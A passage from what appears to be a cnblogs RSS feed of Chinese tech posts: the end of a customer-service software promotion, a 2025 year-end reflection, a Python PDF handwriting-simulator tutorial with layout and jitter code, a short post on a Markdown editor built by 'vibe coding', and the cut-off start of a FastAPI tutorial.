小时挂机运行，网络中断，拔掉网线，手机飞行模式，不掉线不丢消息，欢迎实测。</strong></p>\n<h3 id=\"访客端轻量直观秒级响应的沟通入口\">访客端：轻量直观、秒级响应的沟通入口</h3>\n<p>访客端是客户接触企业的第一窗口，我们精心打磨每一处交互细节，确保用户无需任何学习成本即可发起对话。无论是嵌入式聊天窗口、悬浮按钮，还是移动端自适应支持，都实现了真正的“即点即聊”。系统支持智能欢迎语、来源识别、设备类型判断，可自动记录访客路径并呈现于客服端，帮助企业更好地理解用户意图。在性能方面，访客端采用异步加载与自动重连机制，即使网络波动也能保障消息顺畅送达，真正做到——轻量不失稳定，简单不失智能。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/78019/202506/78019-20250601110426304-100322970.png\" /></p>\n<h3 id=\"客服端软件为高效率沟通而生\">客服端软件：为高效率沟通而生</h3>\n<p>客服端是客服人员的作战平台，我们构建了一个专注、高效、响应迅速的桌面级体验。系统采用多标签会话设计，让客服可同时处理多组对话；访客轨迹、历史会话、地理位置、设备信息、来源渠道等关键信息一目了然，协助客服快速做出判断。内置快捷回复、常用文件、表情支持和智能推荐功能，大幅降低重复劳动成本。同时，系统还支持智能分配、会话转接、转人工、自定义状态等多种机制，保障团队协作流畅，让客服不仅能应对高峰，更能稳定交付满意度。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/78019/202506/78019-20250601110431346-1228494411.png\" /></p>\n<h3 id=\"web-管理后台\">Web 管理后台：</h3>\n<p>Web 管理后台是企业对客服系统的“驾驶舱”，从接入配置、坐席管理，到数据统计、权限控制，一切尽在掌握。你可以灵活设置接待策略、工作时间、转接规则，支持按部门/标签/渠道精细分配访客，满足复杂业务场景。系统还内置访问监控、聊天记录检索、客服绩效统计、错失会话提醒等运营级功能，助力管理者洞察服务瓶颈，持续优化资源配置。支持私有化部署、分权限管理、日志记录与数据导出，为追求安全性与高可控性的企业，提供真正“掌握在自己手里的客服系统”。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/78019/202506/78019-20250601110403917-63642615.png\" /></p>\n<h2 id=\"希望能够打造-开放开源共享努力打造一款优秀的社区开源产品\">希望能够打造： 开放、开源、共享。努力打造一款优秀的社区开源产品。</h2>\n<p>钟意的话请给个赞支持一下吧，谢谢~</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-02 15:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sheng_chao\">升讯威在线客服系统</a>&nbsp;\n阅读(<span id=\"post_view_count\">198</span>)&nbsp;\n评论(<span id=\"post_comment_count\">4</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "2025年终总结——在奔跑中前行",
      "link": "https://www.cnblogs.com/lucky_hu/p/19430418",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lucky_hu/p/19430418\" id=\"cb_post_title_url\" title=\"发布于 2026-01-01 17:27\">\n    <span>2025年终总结——在奔跑中前行</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h3 id=\"导航\">导航</h3>\n<ul>\n<li>前言</li>\n<li>职场人的核心竞争力是什么</li>\n<li>拥抱AI，拥抱大模型</li>\n<li>尝试自媒体</li>\n<li>读毛选</li>\n<li>写过的文章</li>\n<li>结语</li>\n<li>参考</li>\n</ul>\n<br />\n<section>\n    <a href=\"https://img.zhikestreet.com/2026-01-01_165557_428.png?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" rel=\"noopener nofollow\"><img alt=\"\" src=\"https://img.zhikestreet.com/2026-01-01_165557_428.png?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" style=\"display: block; margin-left: auto; margin-right: auto;\" /></a>\n</section> \n<br />\n<h3 id=\"前言\">前言</h3>\n<blockquote>\n<p>不是先学好了再干，而是干起来再学习，干就是学习。——《毛选》</p>\n</blockquote>\n<p>2025年，对于笔者而言，是极不平凡的一年。</p>\n<p>这一年，有快乐、有焦虑、有遗憾、有成长。</p>\n<p><strong>忙碌了一整年，回顾了这一年的经历，笔者对主要工作做了梳理和总结，同时要有一些自己的感悟,或许能与您产生共鸣。</strong></p>\n<h3 id=\"职场人的核心竞争力是什么\">职场人的核心竞争力是什么</h3>\n<blockquote>\n<p>对大部分企业而言，增长才是的核心竞争力,技术不是。</p>\n</blockquote>\n<p>在很多年的技术职业生涯中，笔者曾坚定地认为把产品做好，技术方案做好，兢兢业业，持续迭代，就一定能赢得公司的认可。(请参考<a href=\"https://www.52interview.com/solutions/31\" rel=\"noopener nofollow\" target=\"_blank\">《技术更迭，一往无前》</a>)</p>\n<p>然而,随着工作年限的增长,发现很多企业并不这么认为。他们更看重的是业绩的增长,技术只是实现增长的手段之一。</p>\n<p><strong>结论：让业绩增长才是职场人的核心竞争力。</strong></p>\n<h3 id=\"拥抱ai拥抱大模型\">拥抱AI，拥抱大模型</h3>\n<blockquote>\n<p>一定不能让自己被AI列车甩下，无论是玩还是工作，一定要经常使用它们。</p>\n</blockquote>\n<p>2025年的年初，deepseek-r1的强势发布，让AI大模型在业界引起了轩然大波，各个行业开始纷纷拥抱AI大模型。</p>\n<p>2025年的年末，Manus被Meta收购，在科技界十分轰动。</p>\n<p>过去，我们认为AI只是个玩具，离自己很远。</p>\n<p>而现在，它已经能够做具体的工作了。</p>\n<h3 id=\"尝试自媒体\">尝试自媒体</h3>\n<blockquote>\n<p>转型，不一定非的转行。</p>\n</blockquote>\n<p>2025年的国庆节后，笔者开始做视频号。</p>\n<p>主要基于两点考虑：</p>\n<ul>\n<li>希望能够突破自我，拓宽自己的视野。</li>\n<li>培养兴趣、爱好，丰富自己的生活。</li>\n</ul>\n<p>干技术工作十几年了，如果只是沉浸在技术领域,那未免有些枯燥。<br />\n何况，生活不止是工作，还有诗和远方。</p>\n<br />\n<section>\n    <a href=\"https://img.zhikestreet.com/2026-01-01_160015_444-min.png?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" rel=\"noopener nofollow\"><img alt=\"\" src=\"https://img.zhikestreet.com/2026-01-01_160015_444-min.png?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" style=\"display: block; margin-left: auto; margin-right: auto;\" /></a>\n</section> \n<br />\n<br />\n<section>\n    <a href=\"https://img.zhikestreet.com/2026-01-01_160113_397.png?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" rel=\"noopener nofollow\"><img alt=\"\" src=\"https://img.zhikestreet.com/2026-01-01_160113_397.png?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" style=\"display: block; margin-left: auto; margin-right: auto;\" /></a>\n</section> \n<br />\n<p>做视频很花心思，也很有挑战性，也没啥收益。<br />\n每次期待有粉丝关注，也算是一种成就感。</p>\n<h3 id=\"读毛选\">读毛选</h3>\n<blockquote>\n<p>内心强大才是真正的强大。</p>\n</blockquote>\n<p>2025年，职场遭遇困境，几乎快要到了面临抉择的时候，笔者开始阅读《毛选》。<br />\n就这样，深一脚，浅一脚挺了过来。</p>\n<p>不管是企业还是个人，都有遇到困难的时候。</p>\n<p>有时候，逃避问题很容易，直面问题需要莫大的勇气。</p>\n<p>\"贵人成全你，小人成就你。\"，经历过风雨的人，深有感受。</p>\n<section>\n    <a href=\"https://img.zhikestreet.com/20260101162415_666_2-min.png?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" rel=\"noopener nofollow\"><img alt=\"\" src=\"https://img.zhikestreet.com/20260101162415_666_2-min.png?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" style=\"display: block; margin-left: auto; margin-right: auto;\" /></a>\n</section> \n<br />\n<section>\n    <a href=\"https://img.zhikestreet.com/1767255242289-min.jpg?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" rel=\"noopener nofollow\"><img alt=\"\" src=\"https://img.zhikestreet.com/1767255242289-min.jpg?imageView2/0/q/75|watermark/2/text/NTJJbnRlcnZpZXc=/font/5a6L5L2T/fontsize/240/fill/IzBFMDkwNQ==/dissolve/100/gravity/SouthEast/dx/10/dy/10\" style=\"display: block; margin-left: auto; margin-right: auto;\" /></a>\n</section> \n<br />\n<h3 id=\"写过的文章\">写过的文章</h3>\n<blockquote>\n<p>经验创造价值，分享成就未来。</p>\n</blockquote>\n<ul>\n<li><a href=\"https://www.cnblogs.com/lucky_hu/collections/29080\" target=\"_blank\">《AI工作流实战》</a></li>\n</ul>\n<br />\n<section>\n    <a href=\"https://www.52interview.com/book/100\" rel=\"noopener nofollow\"><img alt=\"\" src=\"https://img.zhikestreet.com/2026-01-01_164320_875.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" /></a>\n</section> \n<br />\n<h3 id=\"结语\">结语</h3>\n<blockquote>\n<p>我们都在奔跑,但是短暂地停下来思考,是为了更好地再出发。</p>\n</blockquote>\n<p>过去的一年，为了\"柴米油盐、三餐四季\"忙碌奔波。</p>\n<p>新的一年，希望可以多一点战略思考，发掘更多个人的潜力和强项，突破发展瓶颈，找到属于自己的赛道。</p>\n<p>以上只是笔者个人的一点点浅见,有理解不对的地方，请大家多多包含和指正。</p>\n<h3 id=\"致谢\">致谢</h3>\n<p>最后，分享一首《踏莎行·元旦》，祝您在新的一年里，一路向阳，温暖前行，万事无忧。</p>\n<blockquote>\n<p>爆竹庭前，树桃门右。香汤浴罢，五更后。高烧银烛，瑞烟喷金兽。萱堂次第了，相为寿。<br />\n改岁宜新、应时纳祐。从今诸事愿、胜如旧。人生强健，喜一年入手。休辞最后饮，酴酥酒。</p>\n</blockquote>\n<br />\n<section>\n <a href=\"https://www.52interview.com/\" rel=\"noopener nofollow\" target=\"_blank\"><img alt=\"\" src=\"https://img.zhikestreet.com/20210522-22216942.jpg\" style=\"display: block; margin-left: auto; margin-right: auto;\" /></a>\n</section> \n<br />\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-01 17:27</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lucky_hu\">楠木大叔</a>&nbsp;\n阅读(<span id=\"post_view_count\">206</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "实用程序：解放双手！Python 打造 PDF 手写模拟器，轻松搞定手写作业",
      "link": "https://www.cnblogs.com/ChenAI-TGF/p/19430267",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ChenAI-TGF/p/19430267\" id=\"cb_post_title_url\" title=\"发布于 2026-01-01 15:59\">\n    <span>实用程序：解放双手！Python 打造 PDF 手写模拟器，轻松搞定手写作业</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本文介绍了一款基于Python开发的PDF手写模拟工具，可自动将电子文本转换为逼真手写效果并填充至PDF指定区域。该工具支持中英文独立配置字体、大小、颜色等参数，通过随机扰动算法模拟真实手写的行倾斜、字符偏移等不规则特性。用户可通过可视化界面框选填写区域、实时预览效果并保存配置模板。技术实现采用PyMuPDF处理PDF核心操作，结合tkinter构建GUI界面，Pillow实现图像渲染。开源项目地址已提供，可帮助学生高效完成手写作业需求，显著提升工作效率。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"前言\">前言</h1>\n<p>作为学生，想必大家都有过被海量手写实验报告、课程作业支配的痛苦。要花费大量时间一笔一划地抄写到纸质文档中再进行扫描成pdf提交，不仅耗时耗力，手写的字迹还可能参差不齐，影响作业美观度。</p>\n<p>为了偷懒，博主开发了一款基于python的PDF手写模拟器，它能够模拟真实手写笔迹，将电脑上的文字批量填充到 PDF 指定区域，支持中文/英文分开配置、手写扰动效果自定义、配置模版复用等功能，生成的效果高度贴近真实手写，帮你彻底告别手动抄写的烦恼。首先来个界面以及效果预览：</p>\n<p><strong>代码已经开源在Github：<a href=\"https://github.com/ChenAI-TGF/PDF_HandWrite\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/ChenAI-TGF/PDF_HandWrite</a><br />\n欢迎大家下载，如果觉得有用的话可以给我点个Star，万分感谢！！<br />\n如果登不上Github的话也欢迎直接私信博主要代码</strong></p>\n<p><img alt=\"在这里插入图片描述\" class=\"lazyload\" /></p>\n<h2 id=\"流程思路总览\">流程思路总览</h2>\n<p>这款 PDF 手写模拟器的整体运作流程可以分为「用户操作流程」和「技术实现流程」两层，清晰易懂：</p>\n<h2 id=\"1--用户操作流程简单易上手\">1.  用户操作流程（简单易上手）</h2>\n<ol>\n<li>\n<p>打开目标 PDF：选择需要填写的实验报告、作业等 PDF 文件；<br />\n<img alt=\"在这里插入图片描述\" class=\"lazyload\" /><br />\n<img alt=\"在这里插入图片描述\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>框选填写区域：在 PDF 预览界面拖动鼠标，框选出需要插入文字的区域（红色矩形标记）；<br />\n<img alt=\"在这里插入图片描述\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>配置手写参数：分别在中文、英文/数字选项卡中调整字体、大小、颜色、扰动效果等参数；<br />\n<img alt=\"在这里插入图片描述\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>输入并预览文字：在右侧文本框输入需要填写的内容，开启「实时预览」查看手写效果；<br />\n<img alt=\"在这里插入图片描述\" class=\"lazyload\" /><br />\n<img alt=\"在这里插入图片描述\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>不满意可实时调整参数<br />\n<img alt=\"在这里插入图片描述\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>确认并保存：效果满意后确认应用笔迹，支持撤销、擦除错误内容，也可保存当前配置为模版，最后导出填写完成的 PDF。</p>\n</li>\n</ol>\n<p><img alt=\"在这里插入图片描述\" class=\"lazyload\" /></p>\n<h3 id=\"2--技术实现流程分层协作\">2.  技术实现流程（分层协作）</h3>\n<ol>\n<li>UI 交互层：基于 tkinter 搭建可视化界面，提供按钮、选项卡、文本框等交互组件，接收用户操作；</li>\n<li>参数配置层：管理中文/英文手写参数，支持配置保存（JSON）与加载，实现模版复用；</li>\n<li>PDF 操作层：基于 PyMuPDF 实现 PDF 的读取、页面渲染、文字插入、擦除、保存等核心操作；</li>\n<li>手写渲染层：核心逻辑层，实现文字排版、语言区分、手写扰动效果生成，最终将模拟手写文字插入 PDF。</li>\n</ol>\n<pre><code class=\"language-bash\">┌─────────────────────┐\n│  UI交互层（tkinter） │  # 可视化交互，接收操作\n└─────────────┬───────┘\n              ▼\n┌─────────────────────┐\n│  参数配置层（JSON）  │  # 参数管理，模版复用\n└─────────────┬───────┘\n              ▼\n┌─────────────────────┐\n│ PDF操作层（PyMuPDF） │  # PDF核心操作（读写/保存等）\n└─────────────┬───────┘\n              ▼\n┌─────────────────────┐\n│  手写渲染层（核心）  │  # 手写效果生成，文字插入\n└─────────────────────┘\n</code></pre>\n<h1 id=\"涉及的具体技术\">涉及的具体技术</h1>\n<p>这款工具基于 Python 生态的常用库开发，技术栈轻量化且实用性强，核心涉及以下技术：</p>\n<ol>\n<li><strong>tkinter</strong>：Python 内置 GUI 库，无需额外安装，负责搭建整个应用的可视化界面，实现按钮点击、参数调整、文本输入、PDF 预览等交互功能；</li>\n<li><strong>PyMuPDF（fitz）</strong>：核心 PDF 处理库，提供高效的 PDF 读取、写入、页面渲染、文字插入、红act标注（擦除功能）等接口，是实现 PDF 编辑的核心依赖；</li>\n<li><strong>Pillow（PIL）</strong>：图像处理库，将 PyMuPDF 渲染出的 PDF 页面像素数据，转换成 tkinter 画布可显示的图像格式，实现 PDF 页面的可视化预览；</li>\n<li><strong>JSON</strong>：轻量级数据格式，用于保存用户配置的手写参数模版（字体、大小、扰动值等），方便后续直接复用，无需重复调整；</li>\n<li><strong>Python 随机数与数学计算</strong>：实现手写效果的「不规则扰动」，模拟真实手写的位置偏移、大小波动、行倾斜等特性；</li>\n<li><strong>TTF 字体支持</strong>：读取自定义 TrueType 字体文件，支持切换不同手写风格字体，适配不同用户的手写习惯。</li>\n</ol>\n<h1 id=\"最终效果演示\">最终效果演示</h1>\n<p><img alt=\"在这里插入图片描述\" class=\"lazyload\" /></p>\n<h1 id=\"代码原理简单讲解手写字体生成--扰动效果\">代码原理简单讲解（手写字体生成 + 扰动效果）</h1>\n<p>我们重点讲解核心功能 —— 手写字体生成与扰动效果的实现，忽略 UI 搭建等辅助代码，聚焦核心逻辑：</p>\n<h2 id=\"一-手写字体生成文字插入-pdf-核心\">一、 手写字体生成（文字插入 PDF 核心）</h2>\n<p>这部分的核心是将文字按规则排版后，插入到 PDF 指定区域，关键步骤如下：</p>\n<ol>\n<li>\n<p><strong>文字与区域预处理</strong><br />\n首先获取文本框中的输入文字，按换行符 <code>\\n</code> 分割成多行，同时将用户框选的预览区域坐标（带缩放比例）转换为 PDF 实际坐标（除以缩放系数 <code>self.zoom</code>），得到真实的填写范围 <code>(x1, y1, x2, y2)</code>。</p>\n<pre><code class=\"language-python\"># 读取输入文字并分割行\ntext = self.text_editor.get(\"1.0\", tk.END).strip(\"\\n\")\nlines = text.split('\\n')\n# 转换为 PDF 实际坐标（去除预览缩放影响）\nx1, y1 = min(self.start_x, self.end_x)/self.zoom, min(self.start_y, self.end_y)/self.zoom\nx2, y2 = max(self.start_x, self.end_x)/self.zoom, max(self.start_y, self.end_y)/self.zoom\n</code></pre>\n</li>\n<li>\n<p><strong>语言区分与参数匹配</strong><br />\n通过 <code>is_chinese</code> 函数判断单个字符是中文还是英文/数字，分别匹配对应的配置参数（中文/英文独立的字体、大小、字距等），确保不同语言的手写效果适配合理。</p>\n<pre><code class=\"language-python\"># 判断是否为中文（含中文标点）\ndef is_chinese(self, char):\n    if '\\u4e00' &lt;= char &lt;= '\\u9fff': return True\n    if char in \"。，、？！：；“”‘’（）《》【】\": return True\n    return False\n\n# 遍历字符时匹配对应语言参数\nlang = 'zh' if self.is_chinese(char) else 'en'\np = self.params[lang]  # 获取对应语言的配置参数\n</code></pre>\n</li>\n<li>\n<p><strong>PDF 文字插入核心 API</strong><br />\n使用 PyMuPDF 的 <code>page.insert_text</code> 方法实现文字插入，这是手写字体生成的关键，核心参数说明如下：</p>\n<ul>\n<li><code>fitz.Point(final_x, final_y)</code>：文字的实际插入坐标（经排版和扰动调整后）；</li>\n<li><code>char</code>：要插入的单个字符（逐字符插入实现精细排版）；</li>\n<li><code>fontsize</code>：字符的实际大小（带大小抖动）；</li>\n<li><code>fontfile</code>：TTF 手写字体文件路径，决定字体风格；</li>\n<li><code>color</code>：文字颜色（默认纯黑，支持用户自定义）；</li>\n<li><code>morph</code>：变换矩阵，实现字符旋转效果（叠加行倾斜与字符旋转抖动）。</li>\n</ul>\n</li>\n<li>\n<p><strong>行与字符排版</strong><br />\n按行遍历文字，逐字符计算插入坐标，处理空格（单独预留间距），当字符横坐标超出框选区域右侧时自动换行，同时根据「行距参数」调整下一行的纵坐标，确保文字排版规整且不超出框选范围。</p>\n</li>\n</ol>\n<h2 id=\"二-扰动效果实现模拟真实手写不规则性\">二、 扰动效果实现（模拟真实手写不规则性）</h2>\n<p>这是工具的灵魂所在，通过「行级扰动」和「字符级扰动」两层效果，彻底摆脱打印体的规整感，贴近真实手写，对应代码中的配置参数：</p>\n<ol>\n<li>\n<p><strong>行级扰动（整行不规则性）</strong><br />\n针对每一行文字，添加整体的偏移和倾斜，模拟手写时「行不直、略有偏移」的特点，对应三个参数：</p>\n<ul>\n<li>行左右平移（<code>line_jitter_x</code>）：随机生成 <code>-line_jitter_x ~ line_jitter_x</code> 范围内的偏移量 <code>line_dx</code>，使每行文字左右轻微晃动；</li>\n<li>行上下平移（<code>line_jitter_y</code>）：随机生成 <code>-line_jitter_y ~ line_jitter_y</code> 范围内的偏移量 <code>line_dy</code>，使行与行之间的间距略有差异；</li>\n<li>行整行倾斜（<code>line_tilt</code>）：随机生成倾斜角度 <code>line_angle_deg</code>，转换为弧度后，通过 <code>tilt_y_offset = (curr_x - line_start_x) * math.tan(line_angle_rad)</code> 计算每个字符的Y轴偏移，实现整行轻微倾斜。</li>\n</ul>\n<pre><code class=\"language-python\"># 行级扰动参数计算\nline_dx = random.uniform(-p_line['line_jitter_x'].get(), p_line['line_jitter_x'].get())\nline_dy = random.uniform(-p_line['line_jitter_y'].get(), p_line['line_jitter_y'].get())\nline_angle_deg = random.uniform(-p_line['line_tilt'].get(), p_line['line_tilt'].get())\nline_angle_rad = math.radians(line_angle_deg)\n</code></pre>\n</li>\n<li>\n<p><strong>字符级扰动（单个字符不规则性）</strong><br />\n针对每个字符，添加位置、大小、旋转的细微差异，模拟手写时「每个字大小不一、略有晃动」的特点，对应三个参数：</p>\n<ul>\n<li>字位置抖动（<code>jitter_pos</code>）：随机生成 <code>(-jitter_pos ~ jitter_pos)</code> 的X、Y偏移量，使字符脱离严格的水平对齐；</li>\n<li>字大小抖动（<code>jitter_size</code>）：在基础字体大小上，随机增减 <code>(-jitter_size ~ jitter_size)</code> 的数值，生成 <code>char_jitter_fs</code>，使字符大小略有差异；</li>\n<li>字旋转抖动（<code>jitter_rot</code>）：随机生成 <code>(-jitter_rot ~ jitter_rot)</code> 的旋转角度，叠加行倾斜角度后，通过 <code>morph</code> 参数实现字符轻微旋转。</li>\n</ul>\n<pre><code class=\"language-python\"># 字符级扰动参数计算\nchar_jitter_x = random.uniform(-p['jitter_pos'].get(), p['jitter_pos'].get())\nchar_jitter_y = random.uniform(-p['jitter_pos'].get(), p['jitter_pos'].get())\nchar_jitter_rot = random.uniform(-p['jitter_rot'].get(), p['jitter_rot'].get())\nchar_jitter_fs = f_size + random.uniform(-p['jitter_size'].get(), p['jitter_size'].get())\n</code></pre>\n</li>\n<li>\n<p><strong>随机数控制（预览稳定 + 实际随机）</strong><br />\n为了保证实时预览时效果稳定可调整，设置随机数种子 <code>random.seed(42)</code> 固定扰动效果；实际应用笔迹时，不设置种子 <code>random.seed()</code>，生成随机的扰动效果，让每次生成的手写风格略有差异，更贴近真实场景。</p>\n<pre><code class=\"language-python\">if is_preview: random.seed(42)  # 预览模式：固定随机数，效果稳定\nelse: random.seed()  # 实际生成：随机种子，效果更真实\n</code></pre>\n</li>\n</ol>\n<h1 id=\"总结\">总结</h1>\n<p>这款 PDF 手写模拟器完美解决了手写作业、实验报告的痛点，兼具「实用性」和「灵活性」：</p>\n<ol>\n<li><strong>实用性拉满</strong>：无需手动抄写，一键生成手写风格 PDF，节省大量时间和精力，生成效果高度贴近真实手写；</li>\n<li><strong>自定义性强</strong>：中文/英文独立配置，支持字体、颜色、大小、字距行距调整，多层扰动参数可精细调控手写风格；</li>\n<li><strong>操作便捷</strong>：可视化界面友好，支持实时预览、撤销、擦除、模版复用，零基础用户也能快速上手；</li>\n<li><strong>技术轻量化</strong>：基于 Python 常用库开发，无需复杂环境配置，代码可灵活修改扩展。</li>\n</ol>\n<p>当然，这款工具还有优化空间，比如支持连笔效果、笔迹粗细变化、批量处理多个 PDF 等。如果大家有类似需求，可以基于这份代码进行二次开发，适配自己的使用场景。希望这款工具能帮大家解放双手，把更多时间投入到核心学习和研究中！</p>\n<p><strong>代码已经开源在Github：<a href=\"https://github.com/ChenAI-TGF/PDF_HandWrite\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/ChenAI-TGF/PDF_HandWrite</a><br />\n欢迎大家下载，如果觉得有用的话可以给我点个Star，万分感谢！！<br />\n如果登不上Github的话也欢迎直接私信博主要代码</strong></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-01 15:59</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ChenAI-TGF\">TTGF</a>&nbsp;\n阅读(<span id=\"post_view_count\">143</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "AI 编程 Vibe coding 尝试，1 天完成多平台 Markdown 编辑/阅读软件开发",
      "link": "https://www.cnblogs.com/jpeanut/p/19433760",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jpeanut/p/19433760\" id=\"cb_post_title_url\" title=\"发布于 2026-01-03 10:41\">\n    <span>AI 编程 Vibe coding 尝试，1 天完成多平台 Markdown 编辑/阅读软件开发</span>\n    \n\n</a>\n\n\t\t</h1>\n\t\t<div class=\"clear\"></div>\n\t\t<div class=\"postBody\">\n\t\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本次尝试借助 AI 编程 Vibe coding 的高效能力，仅用不到 1 天时间便成功开发出多平台 Markdown 编辑器「Sim4SideMarkdown」。项目基于 React+Electron+TypeScript+Vite 技术栈构建\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>AI 编程 Vibe coding 开发速度果然快，全程开发不到 1 天就完成了这款 Markdown 编辑器 ——Sim4SideMarkdown，项目 GitHub 地址：<a href=\"https://github.com/sim4next/Sim4SideMarkdown%E3%80%82\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/sim4next/Sim4SideMarkdown。</a></p>\n<p>编辑器采用 react+electron 框架开发（最初版本用 html+js+electron，因代码集中导致文件臃肿、维护性差，后续改用 react 框架重构），还整合了 TypeScript、Vite 等技术栈，打包支持 Windows 和 macOS 双平台。</p>\n<p>接下来介绍下这款软件的核心功能：</p>\n<ol>\n<li>基础 Markdown 编辑功能，支持目录生成、实时预览（拆分视图），兼容标题、列表、代码块等常用语法；</li>\n<li>实用窗口控制：新增置顶功能（保持窗口在屏幕最前端）、靠边吸附模式（左 / 右靠边，笔记场景高频实用）；</li>\n<li>多标签页编辑，支持文件新建 / 打开（多选择）/ 保存 / 关闭等基础操作，搭配撤销 / 重做、查找 / 替换、跳转行号、插入日期时间等编辑工具；</li>\n<li>多语言设置，适配不同用户的使用习惯，切换便捷；</li>\n<li>支持 dark 模式，适配夜间使用场景，有效保护视力。</li>\n</ol>\n<p>普通模式<br />\n<img alt=\"preview_1\" class=\"lazyload\" /></p>\n<p>Dark模式<br />\n<img alt=\"preview_2\" class=\"lazyload\" /></p>\n<p>靠边吸附模式<br />\n<img alt=\"preview_3\" class=\"lazyload\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t</div>\n\t\t<div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-03 10:41</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jpeanut\">shiming802</a>&nbsp;\n阅读(<span id=\"post_view_count\">23</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "FastAPI响应实战：从JSON到HTML，轻松驾驭多种数据格式",
      "link": "https://www.cnblogs.com/ymtianyu/p/19431991",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ymtianyu/p/19431991\" id=\"cb_post_title_url\" title=\"发布于 2026-01-03 08:34\">\n    <span>FastAPI响应实战：从JSON到HTML，轻松驾驭多种数据格式</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本文深入解析FastAPI的responses模块，涵盖JSON、HTML等多种响应格式的返回方法，详细讲解Jinja2模板引擎的集成与使用，以及HTML静态页面的返回与参数传递技巧，并提供完整代码示例，帮助开发者高效构建Web应用。\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<div>\n<p style=\"font-size: 16px;\">还在为FastAPI的响应格式头疼吗？据统计，<strong style=\"color: rgba(186, 55, 42, 1);\">超过70%的后端开发者</strong>在构建Web应用时，曾因响应格式不当导致前端解析错误或用户体验下降。</p>\n<blockquote style=\"padding: 10px 15px; background-color: rgba(248, 249, 250, 1); margin: 20px 0; color: rgba(85, 85, 